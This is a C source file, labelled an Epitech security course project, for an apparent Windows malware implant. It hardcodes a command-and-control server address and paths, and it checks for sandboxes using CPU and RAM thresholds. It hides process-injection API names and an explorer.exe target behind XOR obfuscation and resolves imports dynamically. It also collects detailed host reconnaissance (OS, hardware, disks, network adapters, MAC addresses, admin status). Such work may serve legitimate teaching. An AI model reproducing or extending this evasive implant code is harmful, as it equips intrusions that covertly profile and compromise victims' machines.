// ============================================================================
// EDUCATIONAL PROJECT - EPITECH T-SEC
// ============================================================================

// ============================================================================
// INCLUDES AND DEFINES
// ============================================================================
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "nt.h"
#include <tlhelp32.h>
#include <rpc.h>

#ifdef _WIN32
    #include <lmcons.h>
    #include <intrin.h>
    #include <iphlpapi.h>
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#else
    #include <sys/utsname.h>
    #include <sys/sysinfo.h>
    #include <sys/statvfs.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <pwd.h>
    #include <mntent.h>
    #include <ifaddrs.h>
    #include <arpa/inet.h>
    #include <net/if.h>
#endif

#pragma comment(lib, "Rpcrt4.lib")


// ============================================================================
// DEBUG MODE CONFIGURATION
// ============================================================================
int DEBUG_MODE = 1; // 1 to enable debug, 0 to disable

#define DEBUG(x, ...) if (DEBUG_MODE) { printf(x, ##__VA_ARGS__); }


// ============================================================================
// CONFIGURATION CONSTANTS
// ============================================================================

// SANDBOXING DETECTION THRESHOLDS
#define THRESHOLD_MAX_CPU 2
#define THRESHOLD_MIN_RAM_MB 2048

// C2 SERVER CONFIGURATION
#define C2_SERVER "162.19.242.23"
#define C2_PORT 3000
#define C2_REGISTER_PATH "/heartbeat/register"
#define C2_HEARTBEAT_PATH "/heartbeat"
#define C2_ARCH_UPDATE_PATH "/api/agent/system-info"


// ============================================================================
// FUNCTION POINTER TYPEDEFS - SYSTEM INFO APIs
// ============================================================================
#ifdef _WIN32
typedef BOOL (WINAPI *pGetVersionEx)(LPOSVERSIONINFO);
typedef void (WINAPI *pGetSystemInfo)(LPSYSTEM_INFO);
typedef LONG (WINAPI *pRegOpenKeyEx)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG (WINAPI *pRegQueryValueEx)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG (WINAPI *pRegCloseKey)(HKEY);
typedef BOOL (WINAPI *pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
typedef DWORD (WINAPI *pGetLogicalDrives)(void);
typedef UINT (WINAPI *pGetDriveType)(LPCSTR);
typedef BOOL (WINAPI *pGetDiskFreeSpaceEx)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
typedef BOOL (WINAPI *pGetVolumeInformation)(LPCSTR, LPSTR, DWORD, LPDWORD, LPDWORD, LPDWORD, LPSTR, DWORD);
typedef DWORD (WINAPI *pGetAdaptersInfo)(PIP_ADAPTER_INFO, PULONG);
typedef BOOL (WINAPI *pAllocateAndInitializeSid)(PSID_IDENTIFIER_AUTHORITY, BYTE, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PSID*);
typedef BOOL (WINAPI *pCheckTokenMembership)(HANDLE, PSID, PBOOL);
typedef PVOID (WINAPI *pFreeSid)(PSID);
typedef BOOL (WINAPI *pGetComputerName)(LPSTR, LPDWORD);
typedef BOOL (WINAPI *pGetUserName)(LPSTR, LPDWORD);
typedef ULONGLONG (WINAPI *pGetTickCount64)(void);
#endif


// ============================================================================
// GLOBAL FUNCTION POINTERS - SYSTEM INFO APIs
// ============================================================================
#ifdef _WIN32
pGetVersionEx myGetVersionEx = NULL;
pGetSystemInfo myGetSystemInfo = NULL;
pRegOpenKeyEx myRegOpenKeyEx = NULL;
pRegQueryValueEx myRegQueryValueEx = NULL;
pRegCloseKey myRegCloseKey = NULL;
pGlobalMemoryStatusEx myGlobalMemoryStatusEx = NULL;
pGetLogicalDrives myGetLogicalDrives = NULL;
pGetDriveType myGetDriveType = NULL;
pGetDiskFreeSpaceEx myGetDiskFreeSpaceEx = NULL;
pGetVolumeInformation myGetVolumeInformation = NULL;
pGetAdaptersInfo myGetAdaptersInfo = NULL;
pAllocateAndInitializeSid myAllocateAndInitializeSid = NULL;
pCheckTokenMembership myCheckTokenMembership = NULL;
pFreeSid myFreeSid = NULL;
pGetComputerName myGetComputerName = NULL;
pGetUserName myGetUserName = NULL;
pGetTickCount64 myGetTickCount64 = NULL;
#endif


// ============================================================================
// GLOBAL FUNCTION POINTERS - INJECTION APIs
// ============================================================================
pOpenProcess openProcess = NULL;
pVirtualProtectEx virtualProtectEx = NULL;
pWriteProcessMemory writeProcessMemory = NULL;
pVirtualAllocEx virtualAllocEx = NULL;
pCreateRemoteThread createRemoteThread = NULL;


// ============================================================================
// ENCRYPTED DATA - INJECTION APIs
// ============================================================================
// XOR key for API functions: 0x35
// XOR key for process names: 0x1b
// Decryption process: Reverse -> XOR decrypt
unsigned char encryptedVirtualAllocEx[] = {
    0x35, 0x4d, 0x70, 0x56, 0x5a, 0x59, 0x59, 0x74, 0x59, 0x54, 0x40, 0x41, 0x47, 0x5c, 0x63
};unsigned char encryptedOpenProcess[] = {
    0x35, 0x46, 0x46, 0x50, 0x56, 0x5a, 0x47, 0x65, 0x5b, 0x50, 0x45, 0x7a
};unsigned char encryptedVirtualProtectEx[] = {
    0x35, 0x4d, 0x70, 0x41, 0x56, 0x50, 0x41, 0x5a, 0x47, 0x65, 0x59, 0x54, 0x40, 0x41, 0x47, 0x5c, 0x63
};unsigned char encryptedWriteProcessMemory[] = {
    0x35, 0x4c, 0x47, 0x5a, 0x58, 0x50, 0x78, 0x46, 0x46, 0x50, 0x56, 0x5a, 0x47, 0x65, 0x50, 0x41, 0x5c, 0x47, 0x62
};unsigned char encryptedCreateRemoteThread[] = {
    0x35, 0x51, 0x54, 0x50, 0x47, 0x5d, 0x61, 0x50, 0x41, 0x5a, 0x58, 0x50, 0x67, 0x50, 0x41, 0x54, 0x50, 0x47, 0x76
};unsigned char encryptedGetModuleHandleA[] = {
    0x35, 0x74, 0x50, 0x59, 0x51, 0x5b, 0x54, 0x7d, 0x50, 0x59, 0x40, 0x51, 0x5a, 0x78, 0x41, 0x50, 0x72
};unsigned char encryptedGetProcAddress[] = {
    0x35, 0x46, 0x46, 0x50, 0x47, 0x51, 0x51, 0x74, 0x56, 0x5a, 0x47, 0x65, 0x41, 0x50, 0x72
};unsigned char encryptedKernel32[] = {
    0x35, 0x59, 0x59, 0x51, 0x1b, 0x07, 0x06, 0x59, 0x50, 0x5b, 0x47, 0x50, 0x5e
};unsigned char encryptedexplorer_exe[] = {
    0x12, 0x1d, 0x2e, 0x51, 0x3c, 0x0a, 0x33, 0x46, 0x7d, 0x14, 0x26, 0x4c, 0x77
};


// ============================================================================
// ENCRYPTED DATA - SYSTEM INFO APIs
// ============================================================================

// GetVersionExA
static unsigned char encryptedGetVersionEx[] = {
    0x72, 0x50, 0x41, 0x63, 0x50, 0x47, 0x46, 0x5c, 0x5a, 0x5b, 0x70, 0x4d, 0x74, 0x35
};

// GetSystemInfo
static unsigned char encryptedGetSystemInfo[] = {
    0x72, 0x50, 0x41, 0x66, 0x4c, 0x46, 0x41, 0x50, 0x58, 0x7c, 0x5b, 0x53, 0x5a, 0x35
};

// RegOpenKeyExA
static unsigned char encryptedRegOpenKeyEx[] = {
    0x67, 0x50, 0x52, 0x7a, 0x45, 0x50, 0x5b, 0x7e, 0x50, 0x4c, 0x70, 0x4d, 0x74, 0x35
};

// RegQueryValueExA
static unsigned char encryptedRegQueryValueEx[] = {
    0x67, 0x50, 0x52, 0x64, 0x40, 0x50, 0x47, 0x4c, 0x63, 0x54, 0x59, 0x40, 0x50, 0x70, 0x4d, 0x74, 0x35
};

// RegCloseKey
static unsigned char encryptedRegCloseKey[] = {
    0x67, 0x50, 0x52, 0x76, 0x59, 0x5a, 0x46, 0x50, 0x7e, 0x50, 0x4c, 0x35
};

// GlobalMemoryStatusEx
static unsigned char encryptedGlobalMemoryStatusEx[] = {
    0x72, 0x59, 0x5a, 0x57, 0x54, 0x59, 0x78, 0x50, 0x58, 0x5a, 0x47, 0x4c, 0x66, 0x41, 0x54, 0x41, 0x40, 0x46, 0x70, 0x4d, 0x35
};

// GetLogicalDrives
static unsigned char encryptedGetLogicalDrives[] = {
    0x72, 0x50, 0x41, 0x79, 0x5a, 0x52, 0x5c, 0x56, 0x54, 0x59, 0x71, 0x47, 0x5c, 0x43, 0x50, 0x46, 0x35
};

// GetDriveTypeA
static unsigned char encryptedGetDriveType[] = {
    0x72, 0x50, 0x41, 0x71, 0x47, 0x5c, 0x43, 0x50, 0x61, 0x4c, 0x45, 0x50, 0x74, 0x35
};

// GetDiskFreeSpaceExA
static unsigned char encryptedGetDiskFreeSpaceEx[] = {
    0x72, 0x50, 0x41, 0x71, 0x5c, 0x46, 0x5e, 0x73, 0x47, 0x50, 0x50, 0x66, 0x45, 0x54, 0x56, 0x50, 0x70, 0x4d, 0x74, 0x35
};

// GetVolumeInformationA
static unsigned char encryptedGetVolumeInformation[] = {
    0x72, 0x50, 0x41, 0x63, 0x5a, 0x59, 0x40, 0x58, 0x50, 0x7c, 0x5b, 0x53, 0x5a, 0x47, 0x58, 0x54, 0x41, 0x5c, 0x5a, 0x5b, 0x74, 0x35
};

// GetAdaptersInfo
static unsigned char encryptedGetAdaptersInfo[] = {
    0x72, 0x50, 0x41, 0x74, 0x51, 0x54, 0x45, 0x41, 0x50, 0x47, 0x46, 0x7c, 0x5b, 0x53, 0x5a, 0x35
};

// AllocateAndInitializeSid
static unsigned char encryptedAllocateAndInitializeSid[] = {
    0x74, 0x59, 0x59, 0x5a, 0x56, 0x54, 0x41, 0x50, 0x74, 0x5b, 0x51, 0x7c, 0x5b, 0x5c, 0x41, 0x5c, 0x54, 0x59, 0x5c, 0x4f, 0x50, 0x66, 0x5c, 0x51, 0x35
};

// CheckTokenMembership
static unsigned char encryptedCheckTokenMembership[] = {
    0x76, 0x5d, 0x50, 0x56, 0x5e, 0x61, 0x5a, 0x5e, 0x50, 0x5b, 0x78, 0x50, 0x58, 0x57, 0x50, 0x47, 0x46, 0x5d, 0x5c, 0x45, 0x35
};

// FreeSid
static unsigned char encryptedFreeSid[] = {
    0x73, 0x47, 0x50, 0x50, 0x66, 0x5c, 0x51, 0x35
};

// GetComputerNameA
static unsigned char encryptedGetComputerName[] = {
    0x72, 0x50, 0x41, 0x76, 0x5a, 0x58, 0x45, 0x40, 0x41, 0x50, 0x47, 0x7b, 0x54, 0x58, 0x50, 0x74, 0x35
};

// GetUserNameA
static unsigned char encryptedGetUserName[] = {
    0x72, 0x50, 0x41, 0x60, 0x46, 0x50, 0x47, 0x7b, 0x54, 0x58, 0x50, 0x74, 0x35
};

// GetTickCount64
static unsigned char encryptedGetTickCount64[] = {
    0x72, 0x50, 0x41, 0x61, 0x5c, 0x56, 0x5e, 0x76, 0x5a, 0x40, 0x5b, 0x41, 0x03, 0x01, 0x35
};


// ============================================================================
// ENCRYPTED DATA - DLL NAMES
// ============================================================================

// kernel32.dll
static unsigned char encryptedKernel32_sys[] = {
    0x5e, 0x50, 0x47, 0x5b, 0x50, 0x59, 0x06, 0x07, 0x1b, 0x51, 0x59, 0x59, 0x35
};

// advapi32.dll
static unsigned char encryptedAdvapi32[] = {
    0x54, 0x51, 0x43, 0x54, 0x45, 0x5c, 0x06, 0x07, 0x1b, 0x51, 0x59, 0x59, 0x35
};

// iphlpapi.dll
static unsigned char encryptedIphlpapi[] = {
    0x5c, 0x45, 0x5d, 0x59, 0x45, 0x54, 0x45, 0x5c, 0x1b, 0x51, 0x59, 0x59, 0x35
};



// ============================================================================
// CRYPTOGRAPHY UTILITY FUNCTIONS
// ============================================================================

/**
 * Déchiffre une chaîne chiffrée avec XOR
 * @param encrypted: Tableau de bytes chiffrés
 * @param length: Longueur du tableau
 * @param key: Clé XOR
 */
void decrypt(unsigned char* encrypted, size_t length, unsigned char key) {
    for (size_t i = 0; i < length; i++) {
        encrypted[i] ^= key;
    }
}

/**
 * Déchiffre avec XOR polyalphabétique (clé multi-octets)
 * @param encrypted: Tableau de bytes chiffrés
 * @param length: Longueur du tableau
 * @param key_array: Tableau de clés XOR
 * @param key_len: Longueur du tableau de clés
 */
void decrypt_poly(unsigned char* encrypted, size_t length, const unsigned char* key_array, size_t key_len) {
    if (key_len == 0) return;

    for (size_t i = 0; i < length; i++) {
        encrypted[i] ^= key_array[i % key_len];
    }
}

void encrypt(unsigned char* data, size_t length, unsigned char key) {
    for (size_t i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

/**
 * Reverse une chaîne chiffrée
 * @param str: Chaîne à reverse
 * @param length: Longueur de la chaîne
 */
void reverse_string(unsigned char* str, size_t length) {
    for (size_t i = 0; i < length / 2; i++) {
        unsigned char temp = str[i];
        str[i] = str[length - i - 1];
        str[length - i - 1] = temp;
    }
}

/**
 * Déchiffre une chaîne avec reverse puis XOR
 * @param encrypted: Tableau de bytes chiffrés et reversés
 * @param length: Longueur du tableau (sans le null terminator)
 * @param key: Clé XOR
 */
void decrypt_reverse_xor(unsigned char* encrypted, size_t length, unsigned char key) {
    reverse_string(encrypted, length);
    decrypt(encrypted, length - 1, key);
    encrypted[length - 1] = '\0';
}

/**
 * Affiche le contenu d'un buffer en format hexadécimal
 * @param data: Pointeur vers les données
 * @param size: Taille des données
 * @param label: Label pour identifier l'affichage
 */
void print_hex_dump(const unsigned char* data, size_t size, const char* label) {
    DEBUG("[HexDump - %s] Size: %zu bytes\n", label, size);
    DEBUG("=== BEGIN HEXDUMP ===\n");

    for (size_t i = 0; i < size; i += 16) {
        // Afficher l'offset
        DEBUG("%08zx: ", i);

        // Afficher les bytes en hexadécimal
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size) {
                DEBUG("%02x ", data[i + j]);
            } else {
                DEBUG("   ");
            }
            if (j == 7) DEBUG(" ");
        }

        // Afficher les caractères ASCII imprimables
        DEBUG(" |");
        for (size_t j = 0; j < 16 && i + j < size; j++) {
            unsigned char c = data[i + j];
            DEBUG("%c", (c >= 32 && c <= 126) ? c : '.');
        }
        DEBUG("|\n");
    }

    DEBUG("=== END HEXDUMP ===\n");
}


// ============================================================================
// BASE64 ENCODING FUNCTIONS
// ============================================================================

static const char base64_chars[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void base64_encode(const unsigned char* input, size_t length, char* output) {
    int i = 0, j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (length--) {
        char_array_3[i++] = *(input++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for(i = 0; i < 4; i++)
                *output++ = base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for(j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

        for (j = 0; j < i + 1; j++)
            *output++ = base64_chars[char_array_4[j]];

        while(i++ < 3)
            *output++ = '=';
    }
    *output = '\0';
}


// ============================================================================
// UUID GENERATION FUNCTIONS
// ============================================================================

void generate_uuid_base64(char* output) {
    UUID uuid;
    UuidCreate(&uuid);

    unsigned char* uuid_bytes = (unsigned char*)&uuid;

    base64_encode(uuid_bytes, sizeof(UUID), output);
}


// ============================================================================
// ARCHITECTURE DETECTION
// ============================================================================

Architecture detect_architecture(void) {
    #if defined(__x86_64__) || defined(_M_X64) || defined(__amd64__)
        return ARCH_X86_64;
    #elif defined(__i386__) || defined(_M_IX86)
        return ARCH_X86;
    #elif defined(__aarch64__) || defined(_M_ARM64)
        return ARCH_ARM64;
    #elif defined(__arm__) || defined(_M_ARM)
        return ARCH_ARM;
    #elif defined(__mips__)
        return ARCH_MIPS;
    #elif defined(__powerpc__) || defined(__ppc__)
        return ARCH_PPC;
    #else
        return ARCH_UNKNOWN;
    #endif
}

const char* architecture_to_string(Architecture arch) {
    switch (arch) {
        case ARCH_X86:      return "x86 (32-bit)";
        case ARCH_X86_64:   return "x86_64 (64-bit)";
        case ARCH_ARM:      return "ARM (32-bit)";
        case ARCH_ARM64:    return "ARM64 (64-bit)";
        case ARCH_MIPS:     return "MIPS";
        case ARCH_PPC:      return "PowerPC";
        default:            return "Unknown";
    }
}


// ============================================================================
// OS DETECTION
// ============================================================================

OperatingSystem detect_os(void) {
    #ifdef _WIN32
        return OS_WINDOWS;
    #elif defined(__linux__)
        return OS_LINUX;
    #elif defined(__APPLE__) || defined(__MACH__)
        return OS_MACOS;
    #elif defined(__FreeBSD__) || defined(__OpenBSD__) || defined(__NetBSD__)
        return OS_BSD;
    #else
        return OS_UNKNOWN;
    #endif
}

const char* os_to_string(OperatingSystem os) {
    switch (os) {
        case OS_WINDOWS:    return "Windows";
        case OS_LINUX:      return "Linux";
        case OS_MACOS:      return "macOS";
        case OS_BSD:        return "BSD";
        default:            return "Unknown";
    }
}


// ============================================================================
// SYSTEM INFO - WINDOWS IMPLEMENTATIONS
// ============================================================================
#ifdef _WIN32

/**
 * Initialise tous les pointeurs de fonctions API
 * @return 0 en cas de succès, -1 en cas d'erreur
 */
int initialize_sysinfo_api_functions(void) {
    DEBUG("[DEBUG] Initializing system info API functions...\n");
    unsigned char key = 0x35;

    // Decrypt DLL names
    decrypt(encryptedKernel32_sys, sizeof(encryptedKernel32_sys), key);
    decrypt(encryptedAdvapi32, sizeof(encryptedAdvapi32), key);
    decrypt(encryptedIphlpapi, sizeof(encryptedIphlpapi), key);

    // Get DLL handles
    HMODULE hKernel32 = GetModuleHandleA((LPCSTR)encryptedKernel32_sys);
    HMODULE hAdvapi32 = LoadLibraryA((LPCSTR)encryptedAdvapi32);
    HMODULE hIphlpapi = LoadLibraryA((LPCSTR)encryptedIphlpapi);

    if (!hKernel32) {
        DEBUG("[ERROR] Failed to get kernel32.dll handle\n");
        return -1;
    }
    if (!hAdvapi32) {
        DEBUG("[ERROR] Failed to load advapi32.dll: %lu\n", GetLastError());
        return -1;
    }
    if (!hIphlpapi) {
        DEBUG("[ERROR] Failed to load iphlpapi.dll: %lu\n", GetLastError());
        return -1;
    }

    // Decrypt function names
    decrypt(encryptedGetVersionEx, sizeof(encryptedGetVersionEx), key);
    decrypt(encryptedGetSystemInfo, sizeof(encryptedGetSystemInfo), key);
    decrypt(encryptedRegOpenKeyEx, sizeof(encryptedRegOpenKeyEx), key);
    decrypt(encryptedRegQueryValueEx, sizeof(encryptedRegQueryValueEx), key);
    decrypt(encryptedRegCloseKey, sizeof(encryptedRegCloseKey), key);
    decrypt(encryptedGlobalMemoryStatusEx, sizeof(encryptedGlobalMemoryStatusEx), key);
    decrypt(encryptedGetLogicalDrives, sizeof(encryptedGetLogicalDrives), key);
    decrypt(encryptedGetDriveType, sizeof(encryptedGetDriveType), key);
    decrypt(encryptedGetDiskFreeSpaceEx, sizeof(encryptedGetDiskFreeSpaceEx), key);
    decrypt(encryptedGetVolumeInformation, sizeof(encryptedGetVolumeInformation), key);
    decrypt(encryptedGetAdaptersInfo, sizeof(encryptedGetAdaptersInfo), key);
    decrypt(encryptedAllocateAndInitializeSid, sizeof(encryptedAllocateAndInitializeSid), key);
    decrypt(encryptedCheckTokenMembership, sizeof(encryptedCheckTokenMembership), key);
    decrypt(encryptedFreeSid, sizeof(encryptedFreeSid), key);
    decrypt(encryptedGetComputerName, sizeof(encryptedGetComputerName), key);
    decrypt(encryptedGetUserName, sizeof(encryptedGetUserName), key);
    decrypt(encryptedGetTickCount64, sizeof(encryptedGetTickCount64), key);

    // Resolve function addresses from kernel32.dll
    myGetVersionEx = (pGetVersionEx)GetProcAddress(hKernel32, (LPCSTR)encryptedGetVersionEx);
    myGetSystemInfo = (pGetSystemInfo)GetProcAddress(hKernel32, (LPCSTR)encryptedGetSystemInfo);
    myGlobalMemoryStatusEx = (pGlobalMemoryStatusEx)GetProcAddress(hKernel32, (LPCSTR)encryptedGlobalMemoryStatusEx);
    myGetLogicalDrives = (pGetLogicalDrives)GetProcAddress(hKernel32, (LPCSTR)encryptedGetLogicalDrives);
    myGetDriveType = (pGetDriveType)GetProcAddress(hKernel32, (LPCSTR)encryptedGetDriveType);
    myGetDiskFreeSpaceEx = (pGetDiskFreeSpaceEx)GetProcAddress(hKernel32, (LPCSTR)encryptedGetDiskFreeSpaceEx);
    myGetVolumeInformation = (pGetVolumeInformation)GetProcAddress(hKernel32, (LPCSTR)encryptedGetVolumeInformation);
    myGetComputerName = (pGetComputerName)GetProcAddress(hKernel32, (LPCSTR)encryptedGetComputerName);
    myGetTickCount64 = (pGetTickCount64)GetProcAddress(hKernel32, (LPCSTR)encryptedGetTickCount64);

    // Resolve function addresses from advapi32.dll
    myGetUserName = (pGetUserName)GetProcAddress(hAdvapi32, (LPCSTR)encryptedGetUserName);
    myRegOpenKeyEx = (pRegOpenKeyEx)GetProcAddress(hAdvapi32, (LPCSTR)encryptedRegOpenKeyEx);
    myRegQueryValueEx = (pRegQueryValueEx)GetProcAddress(hAdvapi32, (LPCSTR)encryptedRegQueryValueEx);
    myRegCloseKey = (pRegCloseKey)GetProcAddress(hAdvapi32, (LPCSTR)encryptedRegCloseKey);
    myAllocateAndInitializeSid = (pAllocateAndInitializeSid)GetProcAddress(hAdvapi32, (LPCSTR)encryptedAllocateAndInitializeSid);
    myCheckTokenMembership = (pCheckTokenMembership)GetProcAddress(hAdvapi32, (LPCSTR)encryptedCheckTokenMembership);
    myFreeSid = (pFreeSid)GetProcAddress(hAdvapi32, (LPCSTR)encryptedFreeSid);

    // Resolve function addresses from iphlpapi.dll
    myGetAdaptersInfo = (pGetAdaptersInfo)GetProcAddress(hIphlpapi, (LPCSTR)encryptedGetAdaptersInfo);

    // Verify all functions were loaded
    if (!myGetVersionEx || !myGetSystemInfo || !myRegOpenKeyEx || !myRegQueryValueEx ||
        !myRegCloseKey || !myGlobalMemoryStatusEx || !myGetLogicalDrives || !myGetDriveType ||
        !myGetDiskFreeSpaceEx || !myGetVolumeInformation || !myGetAdaptersInfo ||
        !myAllocateAndInitializeSid || !myCheckTokenMembership || !myFreeSid ||
        !myGetComputerName || !myGetUserName || !myGetTickCount64) {
        DEBUG("[ERROR] Failed to load one or more API functions\n");
        return -1;
    }

    DEBUG("[DEBUG] All system info API functions loaded successfully\n");
    return 0;
}

static void get_windows_version(char* buffer, size_t size) {
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    #pragma warning(disable: 4996)
    if (myGetVersionEx((OSVERSIONINFO*)&osvi)) {
        snprintf(buffer, size, "Windows %lu.%lu Build %lu",
                osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    } else {
        snprintf(buffer, size, "Windows (version unknown)");
    }
    #pragma warning(default: 4996)
}

static void get_windows_cpu_info(SystemInfo* info) {
    SYSTEM_INFO sysInfo;
    myGetSystemInfo(&sysInfo);

    info->nb_processors = sysInfo.dwNumberOfProcessors;
    info->nb_logical_cores = sysInfo.dwNumberOfProcessors;

    // Get CPU name from registry
    HKEY hKey;
    char cpuBrand[256] = "Unknown CPU";
    DWORD size = sizeof(cpuBrand);

    if (myRegOpenKeyEx(HKEY_LOCAL_MACHINE,
                     "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        myRegQueryValueEx(hKey, "ProcessorNameString", NULL, NULL,
                       (LPBYTE)cpuBrand, &size);
        myRegCloseKey(hKey);
    }

    strncpy(info->cpu_model, cpuBrand, sizeof(info->cpu_model) - 1);
}

static void get_windows_memory_info(SystemInfo* info) {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    myGlobalMemoryStatusEx(&memStatus);

    info->total_ram_mb = memStatus.ullTotalPhys / (1024 * 1024);
    info->available_ram_mb = memStatus.ullAvailPhys / (1024 * 1024);
    info->used_ram_mb = info->total_ram_mb - info->available_ram_mb;
    info->ram_usage_percent = (int)memStatus.dwMemoryLoad;
}

static void get_windows_disk_info(SystemInfo* info) {
    DWORD drives = myGetLogicalDrives();
    info->nb_disks = 0;

    for (int i = 0; i < 26 && info->nb_disks < MAX_DISKS; i++) {
        if (drives & (1 << i)) {
            char drive[4] = {(char)('A' + i), ':', '\\', '\0'};
            UINT driveType = myGetDriveType(drive);

            if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE) {
                ULARGE_INTEGER freeBytesAvailable, totalBytes, freeBytes;

                if (myGetDiskFreeSpaceEx(drive, &freeBytesAvailable,
                                      &totalBytes, &freeBytes)) {
                    DiskInfo* disk = &info->disks[info->nb_disks];
                    snprintf(disk->name, sizeof(disk->name), "%c:", 'A' + i);
                    snprintf(disk->mount_point, sizeof(disk->mount_point), "%s", drive);
                    disk->total_space = totalBytes.QuadPart;
                    disk->free_space = freeBytes.QuadPart;
                    disk->available_space = freeBytesAvailable.QuadPart;

                    char volumeName[MAX_PATH];
                    char fsName[MAX_PATH];
                    if (myGetVolumeInformation(drive, volumeName, MAX_PATH, NULL,
                                            NULL, NULL, fsName, MAX_PATH)) {
                        strncpy(disk->filesystem, fsName, sizeof(disk->filesystem) - 1);
                    }

                    info->nb_disks++;
                }
            }
        }
    }
}

static void get_windows_network_info(SystemInfo* info) {
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD bufferSize = sizeof(adapterInfo);

    info->nb_interfaces = 0;

    if (myGetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        PIP_ADAPTER_INFO adapter = adapterInfo;

        while (adapter && info->nb_interfaces < MAX_INTERFACES) {
            NetworkInterface* iface = &info->interfaces[info->nb_interfaces];

            strncpy(iface->name, adapter->AdapterName, sizeof(iface->name) - 1);
            strncpy(iface->ip_address, adapter->IpAddressList.IpAddress.String,
                   sizeof(iface->ip_address) - 1);

            snprintf(iface->mac_address, sizeof(iface->mac_address),
                    "%02X:%02X:%02X:%02X:%02X:%02X",
                    adapter->Address[0], adapter->Address[1], adapter->Address[2],
                    adapter->Address[3], adapter->Address[4], adapter->Address[5]);

            iface->is_up = (strcmp(iface->ip_address, "0.0.0.0") != 0);

            info->nb_interfaces++;
            adapter = adapter->Next;
        }
    }
}

static int check_windows_admin(void) {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (myAllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
                                 &adminGroup)) {
        myCheckTokenMembership(NULL, adminGroup, &isAdmin);
        myFreeSid(adminGroup);
    }

    return isAdmin;
}

#else

// ============================================================================
// SYSTEM INFO - LINUX IMPLEMENTATIONS
// ============================================================================

static void get_linux_version(char* buffer, size_t size) {
    struct utsname unameData;
    if (uname(&unameData) == 0) {
        snprintf(buffer, size, "%s %s", unameData.sysname, unameData.release);
    } else {
        snprintf(buffer, size, "Linux (version unknown)");
    }
}

static void get_linux_cpu_info(SystemInfo* info) {
    FILE* fp = fopen("/proc/cpuinfo", "r");
    if (!fp) return;

    char line[256];

    info->nb_processors = sysconf(_SC_NPROCESSORS_ONLN);
    info->nb_logical_cores = info->nb_processors;

    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "model name", 10) == 0) {
            char* colon = strchr(line, ':');
            if (colon && strlen(info->cpu_model) == 0) {
                colon += 2;
                colon[strcspn(colon, "\n")] = 0;
                strncpy(info->cpu_model, colon, sizeof(info->cpu_model) - 1);
            }
        } else if (strncmp(line, "cpu MHz", 7) == 0) {
            char* colon = strchr(line, ':');
            if (colon && info->cpu_frequency_mhz == 0) {
                info->cpu_frequency_mhz = (uint64_t)atof(colon + 1);
            }
        }
    }

    fclose(fp);
}

static void get_linux_memory_info(SystemInfo* info) {
    struct sysinfo si;
    if (sysinfo(&si) == 0) {
        info->total_ram_mb = si.totalram * si.mem_unit / (1024 * 1024);
        info->available_ram_mb = si.freeram * si.mem_unit / (1024 * 1024);
        info->used_ram_mb = info->total_ram_mb - info->available_ram_mb;

        if (info->total_ram_mb > 0) {
            info->ram_usage_percent = (int)((info->used_ram_mb * 100) / info->total_ram_mb);
        }

        info->uptime_seconds = si.uptime;
    }
}

static void get_linux_disk_info(SystemInfo* info) {
    FILE* fp = fopen("/proc/mounts", "r");
    if (!fp) return;

    struct mntent* ent;
    info->nb_disks = 0;

    while ((ent = getmntent(fp)) != NULL && info->nb_disks < MAX_DISKS) {
        // Skip virtual filesystems
        if (strncmp(ent->mnt_fsname, "/dev/", 5) != 0) continue;
        if (strcmp(ent->mnt_type, "swap") == 0) continue;

        struct statvfs vfs;
        if (statvfs(ent->mnt_dir, &vfs) == 0) {
            DiskInfo* disk = &info->disks[info->nb_disks];

            strncpy(disk->name, ent->mnt_fsname, sizeof(disk->name) - 1);
            strncpy(disk->mount_point, ent->mnt_dir, sizeof(disk->mount_point) - 1);
            strncpy(disk->filesystem, ent->mnt_type, sizeof(disk->filesystem) - 1);

            disk->total_space = vfs.f_blocks * vfs.f_frsize;
            disk->free_space = vfs.f_bfree * vfs.f_frsize;
            disk->available_space = vfs.f_bavail * vfs.f_frsize;

            info->nb_disks++;
        }
    }

    fclose(fp);
}

